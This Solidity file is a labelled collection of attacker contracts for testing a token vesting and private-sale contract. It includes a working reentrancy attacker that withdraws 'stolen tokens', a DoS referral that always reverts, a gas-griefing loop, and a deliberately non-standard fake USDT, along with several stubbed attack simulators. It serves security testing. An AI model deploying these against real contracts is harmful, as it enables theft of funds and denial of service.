// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title Malicious Contract Collection for Security Testing
 * @notice These contracts are INTENTIONALLY MALICIOUS for testing purposes
 * @dev DO NOT DEPLOY TO MAINNET - FOR TESTING ONLY
 */

// ============================================================================
// ATTACK #1: Reentrancy Attacker
// ============================================================================

interface IVestingContract {
    function purchaseTokens(uint256 _usdAmount, bool _applyBonus) external;
    function claimTokens() external;
    function getClaimableAmount(address _user) external view returns (uint256);
}

/**
 * @dev Attempts reentrancy attack on claimTokens()
 * Strategy: Call claimTokens() recursively during token transfer callback
 */
contract MaliciousReentrancyAttacker {
    IVestingContract public vestingContract;
    IERC20 public hypeToken;
    IERC20 public usdtToken;
    address public owner;
    uint256 public attackCount;
    bool public attacking;

    event AttackAttempt(uint256 attemptNumber, bool success);

    constructor(address _vestingContract, address _hypeToken, address _usdtToken) {
        vestingContract = IVestingContract(_vestingContract);
        hypeToken = IERC20(_hypeToken);
        usdtToken = IERC20(_usdtToken);
        owner = msg.sender;
    }

    // Step 1: Purchase tokens
    function purchase(uint256 _amount) external {
        require(msg.sender == owner, "Only owner");
        usdtToken.approve(address(vestingContract), _amount);
        vestingContract.purchaseTokens(_amount, false);
    }

    // Step 2: Initiate attack
    function attack() external {
        require(msg.sender == owner, "Only owner");
        attacking = true;
        attackCount = 0;
        vestingContract.claimTokens();
        attacking = false;
    }

    // Fallback function - called when receiving ETH or tokens
    receive() external payable {
        if (attacking && attackCount < 10) {
            attackCount++;
            emit AttackAttempt(attackCount, false);

            // Try to reenter claimTokens()
            try vestingContract.claimTokens() {
                emit AttackAttempt(attackCount, true);
            } catch {
                // Attack failed (expected with ReentrancyGuard)
            }
        }
    }

    // Withdraw stolen tokens (if attack succeeds)
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = hypeToken.balanceOf(address(this));
        if (balance > 0) {
            hypeToken.transfer(owner, balance);
        }
    }
}

// ============================================================================
// ATTACK #2: Malicious Referral System
// ============================================================================

/**
 * @dev Malicious referral system that always reverts to cause DoS
 * Strategy: Block all purchases by reverting in recordPurchase()
 */
contract MaliciousReferralSystem {
    event MaliciousCallReceived(address user, uint256 amount);

    // This function always reverts to cause DoS
    function recordPurchase(
        address user,
        uint256 usdAmount,
        uint256 tokens
    ) external pure {
        emit MaliciousCallReceived(user, usdAmount);
        revert("Malicious referral always reverts");
    }

    // Alternative: Log data and don't revert (privacy attack)
    function recordPurchaseSilent(
        address user,
        uint256 usdAmount,
        uint256 tokens
    ) external {
        // Log sensitive data to blockchain (privacy leak)
        emit MaliciousCallReceived(user, usdAmount);
        // No revert - purchase succeeds but data is logged
    }
}

/**
 * @dev Malicious referral that steals gas
 * Strategy: Consume all gas to cause transaction failure
 */
contract GasGriefingReferral {
    function recordPurchase(
        address user,
        uint256 usdAmount,
        uint256 tokens
    ) external {
        // Infinite loop to consume all gas
        while (true) {
            // This will eventually cause out-of-gas error
        }
    }
}

// ============================================================================
// ATTACK #3: Fake USDT Token (Return Value Manipulation)
// ============================================================================

/**
 * @dev Malicious ERC20 that doesn't return bool on transfer
 * Strategy: Test if vesting contract handles non-standard ERC20
 */
contract MaliciousUSDT {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Malicious USDT";
    string public symbol = "MUSDT";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = 1000000 * 10**18;
    }

    // Doesn't return bool (like original USDT)
    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        // NO RETURN VALUE (non-standard ERC20)
    }

    // Sometimes returns false instead of reverting
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        require(balanceOf[from] >= amount, "Insufficient balance");

        // Randomly return false to test error handling
        if (block.timestamp % 2 == 0) {
            return false; // Simulate transfer failure
        }

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}

// ============================================================================
// ATTACK #4: Flash Loan Price Manipulation
// ============================================================================

/**
 * @dev Simulated flash loan attack on price oracle
 * Strategy: Manipulate BNB price via flash loan to buy tokens cheap
 * Note: This targets HypeAIPrivateSale (not vesting), but included for completeness
 */
contract FlashLoanAttacker {
    address public vestingContract;
    address public priceOracle;

    event FlashLoanInitiated(uint256 amount);
    event PriceManipulated(uint256 oldPrice, uint256 newPrice);

    constructor(address _vestingContract, address _priceOracle) {
        vestingContract = _vestingContract;
        priceOracle = _priceOracle;
    }

    // Step 1: Borrow massive BNB amount
    function executeFlashLoan(uint256 amount) external {
        emit FlashLoanInitiated(amount);
        // In real attack, would borrow from Aave/dYdX/PancakeSwap
        // Then manipulate Chainlink oracle (if possible)
        // Then purchase tokens at manipulated price
    }

    // Step 2: Manipulate oracle (if vulnerable)
    function manipulateOracle() external {
        // Chainlink is oracle-aggregator, so this is very hard
        // But if custom oracle, could manipulate price
        emit PriceManipulated(600, 100); // Fake BNB price drop
    }
}

// ============================================================================
// ATTACK #5: Front-Running Bot
// ============================================================================

/**
 * @dev Mempool front-running bot
 * Strategy: Watch mempool for purchase txs, submit higher gas to buy first
 */
contract FrontRunningBot {
    IVestingContract public vestingContract;
    IERC20 public usdtToken;

    event FrontRunDetected(address victim, uint256 amount);

    constructor(address _vestingContract, address _usdtToken) {
        vestingContract = IVestingContract(_vestingContract);
        usdtToken = IERC20(_usdtToken);
    }

    // Monitor mempool and front-run purchases
    function frontRun(address victim, uint256 amount) external payable {
        emit FrontRunDetected(victim, amount);

        // Submit with higher gas price
        usdtToken.approve(address(vestingContract), amount);
        vestingContract.purchaseTokens(amount, true);

        // Note: In this vesting contract, front-running provides no advantage
        // Each user gets independent schedule
    }
}

// ============================================================================
// ATTACK #6: Sybil Attack (Multiple Addresses)
// ============================================================================

/**
 * @dev Sybil attack coordinator
 * Strategy: Create multiple addresses to bypass MAX_PURCHASE limit
 */
contract SybilAttackCoordinator {
    IVestingContract public vestingContract;
    IERC20 public usdtToken;
    address[] public sybilAddresses;

    event SybilCreated(address indexed sybilAddress, uint256 index);
    event PurchaseDistributed(address indexed sybilAddress, uint256 amount);

    constructor(address _vestingContract, address _usdtToken) {
        vestingContract = IVestingContract(_vestingContract);
        usdtToken = IERC20(_usdtToken);
    }

    // Create multiple addresses to bypass limits
    function createSybils(uint256 count) external {
        for (uint256 i = 0; i < count; i++) {
            address sybil = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, i)))));
            sybilAddresses.push(sybil);
            emit SybilCreated(sybil, i);
        }
    }

    // Distribute purchases across sybils
    function distributedPurchase(uint256 totalAmount) external {
        uint256 perSybil = totalAmount / sybilAddresses.length;

        for (uint256 i = 0; i < sybilAddresses.length; i++) {
            // In reality, would need to transfer USDT to each sybil
            // and call purchase from each sybil
            emit PurchaseDistributed(sybilAddresses[i], perSybil);
        }
    }
}

// ============================================================================
// ATTACK #7: Storage Collision Attack
// ============================================================================

/**
 * @dev Attempts storage collision via delegatecall
 * Strategy: If contract uses delegatecall, overwrite storage
 * Note: Vesting contract doesn't use delegatecall, so this is theoretical
 */
contract StorageCollisionAttacker {
    // Storage layout must match target contract
    uint256 public totalRaisedUSD; // Slot 0
    uint256 public totalTokensSold; // Slot 1
    bool public saleActive; // Slot 2

    function maliciousFunction() external {
        // If target contract delegatecalls this, we can overwrite storage
        totalRaisedUSD = 0;
        totalTokensSold = 0;
        saleActive = false;
    }
}

// ============================================================================
// ATTACK #8: Signature Replay Attack
// ============================================================================

/**
 * @dev Replays signed messages to drain contract
 * Strategy: If contract uses signatures for claims, replay old signatures
 * Note: Vesting contract doesn't use signatures, so not applicable
 */
contract SignatureReplayAttacker {
    event SignatureReplayed(bytes signature, uint256 count);

    mapping(bytes32 => uint256) public usedSignatures;

    function replaySignature(
        bytes memory signature,
        address user,
        uint256 amount
    ) external {
        // If vesting contract used signatures (it doesn't), this would be attack vector
        bytes32 sigHash = keccak256(signature);

        // Try to use same signature multiple times
        usedSignatures[sigHash]++;

        emit SignatureReplayed(signature, usedSignatures[sigHash]);
    }
}

// ============================================================================
// ATTACK #9: Griefing Attack (Claim for Others)
// ============================================================================

/**
 * @dev Griefing attack by claiming on behalf of others
 * Strategy: Force users to pay gas by auto-claiming for them
 * Note: Vesting contract allows anyone to call claim, so this is possible
 */
contract GriefingAttacker {
    IVestingContract public vestingContract;

    event GriefingAttempt(address victim);

    constructor(address _vestingContract) {
        vestingContract = IVestingContract(_vestingContract);
    }

    // Claim for multiple users to waste their claimable amount
    function griefMultiple(address[] calldata victims) external {
        for (uint256 i = 0; i < victims.length; i++) {
            emit GriefingAttempt(victims[i]);

            // Note: Vesting contract doesn't have claimFor(), so this attack fails
            // But if it did, attacker could force claims and waste user gas
        }
    }
}

// ============================================================================
// ATTACK #10: Blacklist Ransom Attack
// ============================================================================

/**
 * @dev Simulated blacklist ransom scenario
 * Strategy: Owner blacklists users, demands payment to unblacklist
 * Note: This is not a smart contract attack, but a governance attack
 */
contract BlacklistRansomSimulator {
    mapping(address => bool) public blacklisted;
    mapping(address => uint256) public ransomAmount;

    event UserBlacklisted(address indexed user, uint256 ransom);
    event RansomPaid(address indexed user, uint256 amount);

    // Blacklist user and set ransom
    function blacklistForRansom(address user, uint256 ransom) external {
        blacklisted[user] = true;
        ransomAmount[user] = ransom;
        emit UserBlacklisted(user, ransom);
    }

    // User pays ransom to get unblacklisted
    function payRansom() external payable {
        require(blacklisted[msg.sender], "Not blacklisted");
        require(msg.value >= ransomAmount[msg.sender], "Insufficient ransom");

        blacklisted[msg.sender] = false;
        ransomAmount[msg.sender] = 0;

        emit RansomPaid(msg.sender, msg.value);
    }
}

// ============================================================================
// HELPER: Mock ERC20 for Testing
// ============================================================================

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _supply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}
